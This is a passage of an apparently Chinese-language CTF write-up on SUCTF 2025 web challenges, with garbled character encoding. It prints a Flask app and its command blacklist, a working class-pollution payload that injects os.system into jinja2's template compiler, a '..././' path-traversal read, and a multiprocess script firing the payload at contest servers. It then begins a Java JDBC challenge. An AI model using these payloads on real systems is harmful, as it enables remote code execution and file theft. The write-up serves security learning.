<span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    file_name = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_name:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=<span class="hljs-string">&#x27;&#x27;</span>, content=<span class="hljs-string">&quot;æœªæä¾›æ–‡ä»¶åã€‚&quot;</span>)<br><br>    blacklist = [<span class="hljs-string">&quot;waf.py&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklisted_file <span class="hljs-keyword">in</span> file_name <span class="hljs-keyword">for</span> blacklisted_file <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;å¤§é»‘é˜”ä¸è®¸çœ‹&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_name.startswith(<span class="hljs-string">&#x27;articles/&#x27;</span>):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> file_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> articles.values():<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚&quot;</span>)<br>    <br>    file_path = os.path.join(BASE_DIR, file_name)<br>    file_path = file_path.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            content = f.read()<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        content = <span class="hljs-string">&quot;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        app.logger.error(<span class="hljs-string">f&quot;Error reading file <span class="hljs-subst">&#123;file_path&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        content = <span class="hljs-string">&quot;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚&quot;</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;pass&#x27;</span>)!=<span class="hljs-string">&quot;SUers&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;nonono&quot;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            body = request.json<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> body:<br>                flash(<span class="hljs-string">&quot;No JSON data received&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No JSON data received&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            key = body.get(<span class="hljs-string">&#x27;key&#x27;</span>)<br>            value = body.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flash(<span class="hljs-string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pwaf(key):<br>                flash(<span class="hljs-string">&quot;Invalid key format&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid key format&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cwaf(value):<br>                flash(<span class="hljs-string">&quot;Invalid value format&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid value format&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            set_(user_data, key, value)<br><br>            flash(<span class="hljs-string">&quot;User data updated successfully&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;User data updated successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br><br>        <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>            flash(<span class="hljs-string">&quot;Invalid JSON data&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid JSON data&quot;</span>&#125;), <span class="hljs-number">400</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            flash(<span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, user_data=user_data)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>    flash(<span class="hljs-string">&quot;You have been logged out.&quot;</span>, <span class="hljs-string">&quot;info&quot;</span>)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">10006</span>)<br></code></pre></td></tr></table></figure><p><code>waf.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">key_blacklist = [<br>    <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;router&#x27;</span>, <span class="hljs-string">&#x27;name_index&#x27;</span>,<br>    <span class="hljs-string">&#x27;directory_handler&#x27;</span>, <span class="hljs-string">&#x27;directory_view&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;pardir&#x27;</span>, <span class="hljs-string">&#x27;_static_folder&#x27;</span>,<br>    <span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>,  <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>,<br>]<br><br>value_blacklist = [<br>    <span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;nl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;tail&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;cut&#x27;</span>, <span class="hljs-string">&#x27;awk&#x27;</span>,<br>    <span class="hljs-string">&#x27;strings&#x27;</span>, <span class="hljs-string">&#x27;od&#x27;</span>, <span class="hljs-string">&#x27;ping&#x27;</span>, <span class="hljs-string">&#x27;sort&#x27;</span>, <span class="hljs-string">&#x27;ch&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;mod&#x27;</span>, <span class="hljs-string">&#x27;sl&#x27;</span>, <span class="hljs-string">&#x27;find&#x27;</span>,<br>    <span class="hljs-string">&#x27;sed&#x27;</span>, <span class="hljs-string">&#x27;cp&#x27;</span>, <span class="hljs-string">&#x27;mv&#x27;</span>, <span class="hljs-string">&#x27;ty&#x27;</span>, <span class="hljs-string">&#x27;grep&#x27;</span>, <span class="hljs-string">&#x27;fd&#x27;</span>, <span class="hljs-string">&#x27;df&#x27;</span>, <span class="hljs-string">&#x27;sudo&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;cc&#x27;</span>, <span class="hljs-string">&#x27;tac&#x27;</span>, <span class="hljs-string">&#x27;less&#x27;</span>,<br>    <span class="hljs-string">&#x27;head&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;gcc&#x27;</span>, <span class="hljs-string">&#x27;uniq&#x27;</span>, <span class="hljs-string">&#x27;vi&#x27;</span>, <span class="hljs-string">&#x27;vim&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;xxd&#x27;</span>,<br>    <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;date&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;wget&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>, <span class="hljs-string">&#x27;readflag&#x27;</span><br>]<br><br><span class="hljs-comment"># å°†é»‘åå•è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span><br>key_blacklist_bytes = [word.encode() <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> key_blacklist]<br>value_blacklist_bytes = [word.encode() <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> value_blacklist]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_blacklist</span>(<span class="hljs-params">data, blacklist</span>):<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwaf</span>(<span class="hljs-params">key</span>):<br>    <span class="hljs-comment"># å°† key è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span><br>    key_bytes = key.encode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_blacklist(key_bytes, key_blacklist_bytes):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Key contains blacklisted words.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cwaf</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">77</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Value exceeds 77 characters.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-comment"># å°† value è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span><br>    value_bytes = value.encode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_blacklist(value_bytes, value_blacklist_bytes):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Value contains blacklisted words.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>è¯»æºç åå‘ç°&#x2F;Adminä¸‹å¯ä»¥æ‰“åŸå‹é“¾æ±¡æŸ“ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥æ±¡æŸ“jinja2æ¨¡ç‰ˆç¼–è¯‘æ—¶ç”¨çš„ä¸€ä¸ªå‚æ•°æ¥Rã€‚</p><p>æœ¬æ¥å¼€å§‹æƒ³è¯•è¯•æ±¡æŸ“key_blacklistç„¶åä¸ºæ‰€æ¬²ä¸ºçš„ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__class__.__init__.__globals__.pwaf.__globals__.key_blacklist_bytes&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä½†å…¶å®ä¸ç”¨ï¼Œç›´æ¥Rå°±å®Œäº†ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;*;import os;os.system(&#x27;/readflag &gt;/tmp/sbflag.txt&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">27.25</span><span class="hljs-number">.151</span><span class="hljs-number">.48</span>:<span class="hljs-number">10004</span>/article?file=articles/..././..././..././..././..././..././tmp/sbflag.txt<br></code></pre></td></tr></table></figure><p>ç„¶åæ¸²æŸ“çš„æ—¶å€™å°±ä¼šæŠŠ<code>*;import os;os.system(&#39;/readflag &gt;/tmp/sbflag.txt&#39;)</code>æ‹¼ä¸Šå»ï¼Œç„¶åå†ä»»æ„æ–‡ä»¶è¯»å°±å®Œäº‹äº†ã€‚</p><p>ï¼ˆå› ä¸ºæ¨¡ç‰ˆåªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶ç¼–è¯‘ï¼Œæ‰€ä»¥éœ€è¦å¡å®¹å™¨é‡å¯æ—¶çš„ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè¿™ä¸ªæœ‰ç‚¹å‘éœ€è¦æ‰‹æ°”ï¼‰</p><p>ä¹Ÿå¯ä»¥å€Ÿé‰´ä¸€ä¸‹<code>Syclover</code>æˆ˜é˜Ÿå†™çš„bruteå¤šçº¿ç¨‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> multiprocessing<br>js = &#123;<br>    <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;*;import os;os.system(&#x27;/read\\x66lag &gt; /tmp/f&#x27;)&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url + <span class="hljs-string">&quot;/Admin?pass=SUers&quot;</span>, json=js)<br>            <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&quot;:&quot;</span> + res.text)<br>            requests.get(url + <span class="hljs-string">&quot;/Admin?pass=SUers&quot;</span>)<br>            requests.get(url + <span class="hljs-string">&quot;/&quot;</span>)<br>            requests.get(url + <span class="hljs-string">&quot;/login&quot;</span>)<br>            requests.get(url + <span class="hljs-string">&quot;/register&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    urls=[<span class="hljs-string">&quot;http://27.25.151.48:10000&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10001&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10002&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10003&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10004&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10005&quot;</span>]<br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>        p = multiprocessing.Process(target=brute, args=(url,))<br>        p.start()<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">SUCTF&#123;fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3&#125;<br></code></pre></td></tr></table></figure><h2 id="SU-ezjava"><a href="#SU-ezjava" class="headerlink" title="SU_ezjava"></a>SU_ezjava</h2><p>å¼€å§‹åšjavaäº†ã€‚</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115214329070.png" alt="image-20250115214329070"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">ç½‘ä¸Šæ³„éœ²äº†ä¸€ä¸ªå±é™©çš„æ¥å£ï¼Œä½†æ˜¯ä¸å¤ªèªæ˜çš„ç¨‹åºå‘˜è®¾è®¡äº†é˜²æŠ¤å»ä¿æŠ¤å®ƒï¼Œä½ èƒ½ç»•è¿‡å—ã€‚é¡ºå¸¦ä¸€æï¼Œç»™å‡ºçš„æºç å­˜åœ¨æ··æ·†<br>A dangerous interface has been leaked online, <span class="hljs-keyword">but</span> <span class="hljs-keyword">not</span> very smart programmers have designed protection <span class="hljs-keyword">to</span> protect <span class="hljs-keyword">it</span>. Can you bypass <span class="hljs-keyword">it</span>.By <span class="hljs-keyword">the</span> way, there <span class="hljs-keyword">is</span> confusion <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> provided source code<br>ç¯å¢ƒï¼š (mysql-connector<span class="hljs-number">-8.0</span><span class="hljs-number">.28</span>) <span class="hljs-number">1.95</span><span class="hljs-number">.157</span><span class="hljs-number">.235</span>:<span class="hljs-number">10011</span> æœ¬é¢˜ä¸éœ€è¦æ‰«æã€çˆ†ç ´ç­‰æ“ä½œ<br></code></pre></td></tr></table></figure><p>è¦ç”¨jadxæ‰èƒ½æ­£ç¡®æ‰“å¼€é‚£ä¸ªclassæ–‡ä»¶ï¼Œå› ä¸ºæœ‰æ··æ·†ã€‚</p><p><code>SecurityChecker.class</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pho3n1x.sujava.security;<br><br><span class="hljs-keyword">import</span> java.io.UnsupportedEncodingException;<br><span class="hljs-keyword">import</span> java.net.URLDecoder;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><span class="hljs-keyword">import</span> java.util.stream.Collectors;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.StringUtils;<br><br><span class="hljs-comment">/* loaded from: SecurityChecker.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityChecker</span> &#123;<br><br>    <span class="hljs-comment">/* renamed from: checklist = &quot;allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#&quot;;</span><br><span class="hljs-comment">public static void checkJdbcConnParams(String host, Integer port, String username, String password, String database, Map&lt;String, Object&gt; extraParams) throws Exception &#123;</span><br><span class="hljs-comment">if (!host.trim().matches(&quot;^[a-zA-Z0-9.-]+$&quot;) || !database.matches(&quot;^[a-zA-Z0-9_]+$&quot;) || parseParamsMapToMysqlParamUrl(extraParams).matches(&quot;.*(allowLoadLocalInfile|autoDeserialize|allowLocalInfile|allowUrlInLocalInfile|#|%).*&quot;)) &#123;</span><br><span class="hljs-comment">throw new Exception(&quot;Invalid mysql connection params.&quot;);</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;  reason: not valid java name and contains not printable characters */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">f0x2356168a</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AND_SYMBOL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&amp;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EQUAL_SIGN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;=&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">COMMA</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;,&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BLACKLIST_REGEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;autodeserialize|allowloadlocalinfile|allowurlinlocalinfile|allowloadlocalinfileinpath&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 